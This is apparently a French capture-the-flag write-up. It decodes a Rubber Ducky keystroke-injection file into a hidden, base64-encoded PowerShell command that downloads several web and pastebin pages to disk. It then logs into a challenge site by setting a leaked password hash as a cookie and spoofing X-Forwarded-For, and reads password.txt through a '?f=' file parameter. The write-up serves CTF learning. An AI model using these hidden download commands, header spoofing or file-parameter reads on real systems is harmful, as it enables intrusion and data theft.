On se retrouver avec le fichier inject.bin
Pour retrouver le script rubber ducky on va utiliser: https://ducktoolkit.com/decoder/

On obtient le code suivante:

```
DELAY
DELAY
powershellDELAY
powershell -W Hidden -nop -noni -enc JHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3R3aXR0ZXIuY29tLyIpLmNvbnRlbnQKZWNobyAkcmF3ID4gLlwxLnR4dAokcmF3ID0gKGludm9rZS13ZWJyZXF1ZXN0IC11cmkgImh0dHBzOi8vZ29vZ2xlLmNvbS8iKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cMi50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL2d1bGxpLmNvbS8iKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cMy50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvazBkaThWeWsiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cNC50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvdXBIY3g2ZmsiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cNS50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvd3FWWDlXQ1oiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cNi50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvQ3JmQzJBZFMiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cNy50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvSmtKc2ZZQkMiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cOC50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvUm4yQzNYdVUiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cOS50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvRjg0S1ZqcEQiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cMTAudHh0CiRyYXcgPSAoaW52b2tlLXdlYnJlcXVlc3QgLXVyaSAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1lValZ2dEpwIikuY29udGVudAplY2hvICRyYXcgPiAuXDExLnR4dA==
```

On va décoder le base64 suivant:

```
JHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3R3aXR0ZXIuY29tLyIpLmNvbnRlbnQKZWNobyAkcmF3ID4gLlwxLnR4dAokcmF3ID0gKGludm9rZS13ZWJyZXF1ZXN0IC11cmkgImh0dHBzOi8vZ29vZ2xlLmNvbS8iKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cMi50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL2d1bGxpLmNvbS8iKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cMy50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvazBkaThWeWsiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cNC50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvdXBIY3g2ZmsiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cNS50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvd3FWWDlXQ1oiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cNi50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvQ3JmQzJBZFMiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cNy50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvSmtKc2ZZQkMiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cOC50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvUm4yQzNYdVUiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cOS50eHQKJHJhdyA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvRjg0S1ZqcEQiKS5jb250ZW50CmVjaG8gJHJhdyA+IC5cMTAudHh0CiRyYXcgPSAoaW52b2tlLXdlYnJlcXVlc3QgLXVyaSAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1lValZ2dEpwIikuY29udGVudAplY2hvICRyYXcgPiAuXDExLnR4dA==
```

On obtient:

```
$raw = (invoke-webrequest -uri "https://twitter.com/").content
echo $raw > .\1.txt
$raw = (invoke-webrequest -uri "https://google.com/").content
echo $raw > .\2.txt
$raw = (invoke-webrequest -uri "https://gulli.com/").content
echo $raw > .\3.txt
$raw = (invoke-webrequest -uri "https://pastebin.com/raw/k0di8Vyk").content
echo $raw > .\4.txt
$raw = (invoke-webrequest -uri "https://pastebin.com/raw/upHcx6fk").content
echo $raw > .\5.txt
$raw = (invoke-webrequest -uri "https://pastebin.com/raw/wqVX9WCZ").content
echo $raw > .\6.txt
$raw = (invoke-webrequest -uri "https://pastebin.com/raw/CrfC2AdS").content
echo $raw > .\7.txt
$raw = (invoke-webrequest -uri "https://pastebin.com/raw/JkJsfYBC").content
echo $raw > .\8.txt
$raw = (invoke-webrequest -uri "https://pastebin.com/raw/Rn2C3XuU").content
echo $raw > .\9.txt
$raw = (invoke-webrequest -uri "https://pastebin.com/raw/F84KVjpD").content
echo $raw > .\10.txt
$raw = (invoke-webrequest -uri "https://pastebin.com/raw/YUjVvtJp").content
echo $raw > .\11.txt
```

En analysant les différents liens Pastebin deux nous intéressent vraiment.
Il s'agit de https://pastebin.com/raw/JkJsfYBC:

```
newbiecompany.bb02c6365c097bdf75be3f6885d2af334e7ce4d7.rtfm.re
username;password;ip;rank
HodorTheHaxor;A755E73616D5F109B344310A0484564847CC0F1F935DC03C575739D2889801B1A103352AA516ABB1A02F4C35AE9E6CAE6F817929C1B148E9B4D63D471C902E67;56.78.91.121;0
MhackBird;276C92A21FF75DD64582A71F741BC94A836D681BA088C8DA94933331C446331E69997068B7396B55E080CC3040F99E01BC7B36EC35E3E06221F24C6AEF749CF2;33.45.89.12;1
Th3_L5D;7B3AF9A4A9384637F7FA2D216DAE620B7134CB00CDD607B1E25C11B7C77E7FC8B6D3959572C61D03F0142B65EC719D2179A876DEEB6E56CA916F838D470D45FE;127.0.0.1;2
InfauxSec;61251196EFC879A8D5CD3C8949E41A8D1E4AFF20E627755CAD83D81243D8C35DBD303801088325E5659D69A4DAEF85029417C8EDB2C1F04F16C7C3FFCCAA4942;90.14.56.78;0
Bidule;FC14914289B746A1A026470CBBFEAD0E70066CB3FE513681D6A07EFBCA0C692C6C7BC04835E2AEFAF726664945ED51A916B7472E4D6F233C93941016E468206D;78.66.44.22;1
Shrewk;0B48DA3A6ACDB9FEE4F8632988B62EFC68ED18C5E0C55666D4A336373D00F2CC5A2002E7B118B335E3AE7A04498AFBCB21CB035BAB48D5C51CEE98F8B606C060;90.33.99.44;0
```

Et de https://pastebin.com/raw/YUjVvtJp:
```
if(isset($_COOKIE["hash"]))
	{
		$hash = array(
			"A755E73616D5F109B344310A0484564847CC0F1F935DC03C575739D2889801B1A103352AA516ABB1A02F4C35AE9E6CAE6F817929C1B148E9B4D63D471C902E67" => "HodorTheHaxor",
			"276C92A21FF75DD64582A71F741BC94A836D681BA088C8DA94933331C446331E69997068B7396B55E080CC3040F99E01BC7B36EC35E3E06221F24C6AEF749CF2" => "MhackBird",
			"7B3AF9A4A9384637F7FA2D216DAE620B7134CB00CDD607B1E25C11B7C77E7FC8B6D3959572C61D03F0142B65EC719D2179A876DEEB6E56CA916F838D470D45FE" => "Th3_L5D",
			"61251196EFC879A8D5CD3C8949E41A8D1E4AFF20E627755CAD83D81243D8C35DBD303801088325E5659D69A4DAEF85029417C8EDB2C1F04F16C7C3FFCCAA4942" => "InfauxSec",
			"Bidule" => "FC14914289B746A1A026470CBBFEAD0E70066CB3FE513681D6A07EFBCA0C692C6C7BC04835E2AEFAF726664945ED51A916B7472E4D6F233C93941016E468206D",
			"Shrewk" => "0B48DA3A6ACDB9FEE4F8632988B62EFC68ED18C5E0C55666D4A336373D00F2CC5A2002E7B118B335E3AE7A04498AFBCB21CB035BAB48D5C51CEE98F8B606C060",


		);
		$cookie = $_COOKIE["hash"];
		$_SESSION["user"] = $hash[$cookie];
	}
```

On peut voir qu'il y a un site à l'adresse newbiecompany.bb02c6365c097bdf75be3f6885d2af334e7ce4d7.rtfm.re

En nous y rendant on tombe sur une page de connexion.
Avec le deuxième pastebin on tombe sur un bout de code qui comporte un bug:

```
"Bidule" => "FC14914289B746A1A026470CBBFEAD0E70066CB3FE513681D6A07EFBCA0C692C6C7BC04835E2AEFAF726664945ED51A916B7472E4D6F233C93941016E468206D",
"Shrewk" => "0B48DA3A6ACDB9FEE4F8632988B62EFC68ED18C5E0C55666D4A336373D00F2CC5A2002E7B118B335E3AE7A04498AFBCB21CB035BAB48D5C51CEE98F8B606C060",
```

Et on peut voir qu'il faut mettre le hash d'un utilisateur dans le cookie hash pour se connecter.
On met le hash de HodorTheHaxor en cookie et on se rend sur l'index mais ça ne fait rien.
En se rendant sur home.php on est redirigé sur l'adresse.
Un élément doit manquer mais en regardant le contenu des fichiers il y a des ip.

On set le header X-Forwarded-For avec l'ip de HodorTheHaxor et magie on est connecté !

Cependant il n'y a rien d'intéressant sur le home.php
Dans le premier fichier il y a aussi des ranks.

En se connectant avec le compte de TH3_L5D, on a le nom du fichier hacked.php qui s'affiche et dans le code source on tombe sur:

```
<!-- ?f=<nondufichier> -->
```

On fait donc http://newbiecompany.bb02c6365c097bdf75be3f6885d2af334e7ce4d7.rtfm.re/home.php?f=hacked.php et on se retrouve avec la deface du celebre Dark Duck.

Dans le code source on retrouve:

```
<!-- il existe aussi le fichier password.txt -->
```

On se rend à l'adresse http://newbiecompany.bb02c6365c097bdf75be3f6885d2af334e7ce4d7.rtfm.re/home.php?f=password.txt

Et bingo ! On a le flag \o/ !
